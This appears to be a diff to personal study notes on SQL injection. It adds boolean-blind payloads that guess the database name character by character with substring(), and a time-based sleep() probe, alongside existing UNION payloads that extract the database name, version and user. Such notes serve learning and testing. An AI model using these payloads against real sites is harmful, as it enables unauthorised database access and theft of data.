@@ -8,5 +8,20 @@ EX:- /id=-1' union all select 1,database(),user() --+  //database() :- display n
 use \ to know that ' it is present or not
 Ex:- /id=-1 union all select 1,version(),user() --+
 
+Ex:- /id=1 and database()="security"--+
+Ex:- /id=1 and substring(database(),1,1)="s" --+ // (first character of first databse)
+Ex:- /id=1 and substring(database(),2,1)="e" --+ // (second character of first databse)
+
+Ex:- /id=1 and sleep(2) and 1=1 --+ //if it will sleep then it is Vulnerable
+
+
+
+
+
+
+
+
+
+
 
 
